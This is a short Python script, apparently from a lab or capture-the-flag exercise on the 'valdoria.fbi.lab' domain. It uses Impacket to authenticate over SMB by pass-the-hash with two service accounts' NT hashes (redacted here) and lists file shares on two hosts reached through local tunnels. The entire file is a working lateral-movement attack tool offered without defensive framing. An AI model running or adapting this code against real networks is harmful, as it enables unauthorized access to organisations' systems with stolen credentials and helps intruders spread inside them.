#!/usr/bin/env python3
"""Enumeration SMB en pass-the-hash via les tunnels locaux (127.0.0.1:144x)."""
import sys
from impacket.smbconnection import SMBConnection

HASHES = {
    "svc_backup": "HEX_EXPURGE",
    "svc_mssql": "HEX_EXPURGE",
}
DOMAIN = "valdoria.fbi.lab"

TARGETS = [
    ("FS01", "127.0.0.1", 1446),
    ("APP01", "127.0.0.1", 1445),
]

def list_shares(name, host, port, user, nthash):
    try:
        conn = SMBConnection(host, host, sess_port=port, timeout=15)
        conn.login(user, "", DOMAIN, lmhash="", nthash=nthash)
        print(f"[+] {name} (via {host}:{port}) auth OK as {user}")
        for sh in conn.listShares():
            print(f"    share: {sh['shi1_netname']}  type={sh['shi1_type']}  remark={sh['shi1_remark']}")
        return conn
    except Exception as e:
        print(f"[-] {name} as {user}: {type(e).__name__}: {e}")
        return None

for name, host, port in TARGETS:
    for user, h in HASHES.items():
        list_shares(name, host, port, user, h)
        print()
